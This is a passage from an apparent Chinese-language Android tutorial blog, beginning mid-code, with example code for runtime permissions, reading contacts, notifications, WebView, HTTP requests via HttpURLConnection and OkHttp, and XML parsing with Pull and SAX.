class="keyword">if</span>(ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.permission.CALL_PHONE)!= PackageManager.PERMISSION_GRANTED)</span><br><span class="line">                &#123;</span><br><span class="line">                    ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>,<span class="keyword">new</span> String[]&#123;Manifest.permission.CALL_PHONE&#125;,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    call();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//使用intent来拨打电话</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_CALL);</span><br><span class="line">            intent.setData(Uri.parse(<span class="string">&quot;tel:10086&quot;</span>));</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (SecurityException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//checkSelfPermission的回调函数，会将结果返回到这个函数中，进行进一步的处理</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)</span><br><span class="line">                    call();</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>,<span class="string">&quot;you denied the permission&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<h3 id="例子显示联系人列表"><a href="#例子显示联系人列表" class="headerlink" title="例子显示联系人列表"></a>例子显示联系人列表</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--添加权限声明--&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayAdapter&lt;String&gt; adapter;</span><br><span class="line">    List&lt;String&gt; contactsList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        ListView contactsView = (ListView) findViewById(R.id.contacts_view);</span><br><span class="line">        adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="keyword">this</span>, android.R.layout.simple_list_item_1,contactsList);</span><br><span class="line">        contactsView.setAdapter(adapter);</span><br><span class="line">        <span class="keyword">if</span>(ContextCompat.checkSelfPermission(<span class="keyword">this</span>,Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED)</span><br><span class="line">        &#123;</span><br><span class="line">            ActivityCompat.requestPermissions(<span class="keyword">this</span>,<span class="keyword">new</span> String[]&#123;Manifest.permission.READ_CONTACTS&#125;,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            readContacts();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用getContentResolver的query的方法，会返回一个cursor，需要取出当中的内容</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readContacts</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Cursor cursor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span>(cursor != <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">while</span> ( cursor.moveToNext())</span><br><span class="line">                &#123;</span><br><span class="line">                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));</span><br><span class="line">                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));</span><br><span class="line">                    contactsList.add(displayName+<span class="string">&quot;\n&quot;</span>+number);</span><br><span class="line">                &#125;</span><br><span class="line">                adapter.notifyDataSetChanged();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(cursor != <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cursor.close();<span class="comment">//关闭游标</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span>(grantResults.length &gt;<span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)</span><br><span class="line">                    readContacts();</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>,<span class="string">&quot;you denied the permission&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="自定义内容提供器"><a href="#自定义内容提供器" class="headerlink" title="自定义内容提供器"></a>自定义内容提供器</h3><p>用于不同应用之间数据库互相访问的接口。</p>
<p>参考书７．４</p>
<h2 id="通知"><a href="#通知" class="headerlink" title="通知"></a>通知</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="meta">@RequiresApi(api = Build.VERSION_CODES.O)</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        createNotificationChannel();</span><br><span class="line">        Button sendNotice =(Button) findViewById(R.id.send_notice);</span><br><span class="line">        sendNotice.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                NotificationCompat.Builder builder = <span class="keyword">new</span> NotificationCompat.Builder(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;text&quot;</span>)<span class="comment">//通道名</span></span><br><span class="line">                        .setSmallIcon(R.drawable.ic_launcher_background)</span><br><span class="line">                        .setContentTitle(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">                        .setContentText(<span class="string">&quot;this is a test notification&quot;</span>)</span><br><span class="line">                        .setPriority(NotificationCompat.PRIORITY_DEFAULT);</span><br><span class="line"></span><br><span class="line">				<span class="comment">//显示通知</span></span><br><span class="line">                NotificationManagerCompat notificationManager = NotificationManagerCompat.from(MainActivity.<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// notificationId is a unique int for each notification that you must define，这里的１可以自定义，只要是独一无二的就可，notificationID</span></span><br><span class="line">                notificationManager.notify(<span class="number">1</span>, builder.build());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequiresApi(api = Build.VERSION_CODES.O)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createNotificationChannel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Create the NotificationChannel, but only on API 26+ because</span></span><br><span class="line">        <span class="comment">// the NotificationChannel class is new and not in the support library</span></span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">            CharSequence name = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">            String description = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">            <span class="keyword">int</span> importance = NotificationManager.IMPORTANCE_DEFAULT;</span><br><span class="line">            NotificationChannel channel = <span class="keyword">new</span> NotificationChannel(<span class="string">&quot;text&quot;</span>, name, importance);</span><br><span class="line">            channel.setDescription(description);</span><br><span class="line">            <span class="comment">// Register the channel with the system; you can&#x27;t change the importance</span></span><br><span class="line">            <span class="comment">// or other notification behaviors after this</span></span><br><span class="line">            NotificationManager notificationManager = getSystemService(NotificationManager.class);</span><br><span class="line">            notificationManager.createNotificationChannel(channel);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h2 id="webview"><a href="#webview" class="headerlink" title="webview"></a>webview</h2><p>MainActivity.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  WebView webView = findViewById(R.id.web_view);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> WebViewClient());</span><br><span class="line">        webView.loadUrl(<span class="string">&quot;https://www.dogedoge.com&quot;</span>);</span><br><span class="line"><span class="comment">//如果不是https需要在在AndroidManifest中的&lt;application标签中加入android:usesCleartextTraffic=&quot;true&quot;</span></span><br><span class="line"><span class="comment">//原因：高版本已经不允许明文传输（使用http）（因为不安全），所以使用android:usesCleartextTraffic=&quot;true&quot;强制允许明文传输</span></span><br></pre></td></tr></table></figure>

<p>manifest.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>activity_main.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/web_view&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure>







<h2 id="httpConnection"><a href="#httpConnection" class="headerlink" title="httpConnection"></a>httpConnection</h2><ul>
<li><p>原生实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   TextView responseText;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(v.getId() == R.id.send_request)</span><br><span class="line">            sendrequestWithHttpURLConnection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendrequestWithHttpURLConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//开启线程来发起网络请求</span></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">                BufferedReader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://www.dogedoge.com&quot;</span>);</span><br><span class="line">                connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">                connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">                connection.setConnectTimeout(<span class="number">8000</span>);</span><br><span class="line">                connection.setReadTimeout(<span class="number">8000</span>);</span><br><span class="line">                InputStream in = connection.getInputStream();</span><br><span class="line"><span class="comment">//                下面对获取到的输入流进行读取</span></span><br><span class="line">                reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">                StringBuilder response = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">                    response.append(line);</span><br><span class="line"></span><br><span class="line">                showResponse(response.toString());</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(reader!=<span class="keyword">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        reader.close();</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (IOException e)</span><br><span class="line">                    &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(connection != <span class="keyword">null</span>)</span><br><span class="line">                    connection.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span>  <span class="keyword">void</span> <span class="title">showResponse</span><span class="params">(<span class="keyword">final</span> String response)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//                呈现结果到界面上</span></span><br><span class="line">                responseText.setText(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">   &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/send_request&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;send request&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/response_text&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--ScrollView保证可以滚动--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>okhttp实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    TextView responseText;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(v.getId() == R.id.send_request)</span><br><span class="line">            sendRequestWithOkHttp();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">//使用okhttp库</span></span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">&quot;https://www.dogedoge.com&quot;</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responeseData = response.body().string();</span><br><span class="line">                    showResponse(responeseData);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)</span><br><span class="line">                &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span>  <span class="keyword">void</span> <span class="title">showResponse</span><span class="params">(<span class="keyword">final</span> String response)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//                呈现结果到界面上</span></span><br><span class="line">                responseText.setText(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="解析xml"><a href="#解析xml" class="headerlink" title="解析xml"></a>解析xml</h3><h4 id="pull解析"><a href="#pull解析" class="headerlink" title="pull解析"></a>pull解析</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">              <span class="keyword">try</span>&#123;</span><br><span class="line">                  <span class="comment">//使用okhttp实现</span></span><br><span class="line">                  OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                  Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                          .url(<span class="string">&quot;http://10.0.2.2:88/get_data.xml&quot;</span>)<span class="comment">//模拟器访问宿主机本地服务localhost</span></span><br><span class="line">                          .build();</span><br><span class="line">                  Response response = client.newCall(request).execute();</span><br><span class="line">                  String responseData = response.body().string();</span><br><span class="line">                  parseXMLWithPull(responseData);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">catch</span> (Exception e)</span><br><span class="line">              &#123;</span><br><span class="line">                  e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;).start();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithPull</span><span class="params">(String xmlData)</span></span>&#123;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              XmlPullParserFactory factory = XmlPullParserFactory.newInstance();</span><br><span class="line">              XmlPullParser xmlPullParser = factory.newPullParser();</span><br><span class="line">              xmlPullParser.setInput(<span class="keyword">new</span> StringReader(xmlData));</span><br><span class="line">              <span class="keyword">int</span> eventType = xmlPullParser.getEventType();</span><br><span class="line">              String id=<span class="string">&quot;&quot;</span>;</span><br><span class="line">              String name =<span class="string">&quot;&quot;</span>;</span><br><span class="line">              String version = <span class="string">&quot;&quot;</span>;</span><br><span class="line">              <span class="keyword">while</span>(eventType != xmlPullParser.END_DOCUMENT)</span><br><span class="line">              &#123;</span><br><span class="line">                  String nodename = xmlPullParser.getName();</span><br><span class="line">                  <span class="keyword">switch</span> (eventType)</span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="keyword">case</span> XmlPullParser.START_TAG:</span><br><span class="line">                      &#123;</span><br><span class="line">                          <span class="keyword">if</span>(<span class="string">&quot;id&quot;</span>.equals(nodename))</span><br><span class="line">                              id = xmlPullParser.nextText();</span><br><span class="line">                          <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;name&quot;</span>.equals(nodename))</span><br><span class="line">                              name = xmlPullParser.nextText();</span><br><span class="line">                          <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;version&quot;</span>.equals(nodename))</span><br><span class="line">                              version = xmlPullParser.nextText();</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">case</span> XmlPullParser.END_TAG:</span><br><span class="line">                      &#123;</span><br><span class="line">                          <span class="keyword">if</span>(<span class="string">&quot;app&quot;</span>.equals(nodename))</span><br><span class="line">                          &#123;</span><br><span class="line">                              Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;id is&quot;</span>+id);</span><br><span class="line">                              Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;name is&quot;</span>+name);</span><br><span class="line">                              Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;version is&quot;</span>+version);</span><br><span class="line">                          &#125;</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">default</span>:</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  eventType = xmlPullParser.next();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;<span class="keyword">catch</span> (Exception e)</span><br><span class="line">          &#123;</span><br><span class="line">              e.printStackTrace();</span><br><span class="line">          &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h4 id="sax解析"><a href="#sax解析" class="headerlink" title="sax解析"></a>sax解析</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">&quot;http://10.0.2.2:88/get_data.xml&quot;</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseXMLWithSAX(responseData);</span><br><span class="line"><span class="comment">//                    parseXMLWithPull(responseData);</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)</span><br><span class="line">                &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithSAX</span><span class="params">(String xmlData)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXParserFactory factory = SAXParserFactory.newInstance();</span><br><span class="line">            XMLReader xmlReader = factory.newSAXParser().getXMLReader();</span><br><span class="line">            ContentHandler handler= <span class="keyword">new</span> ContentHandler();</span><br><span class="line">            <span class="comment">//将ContentHandler的实例设置到XMLReader中</span></span><br><span class="line">            xmlReader.setContentHandler(handler);</span><br><span class="line">            <span class="comment">//开始执行解析</span></span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(xmlData)));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

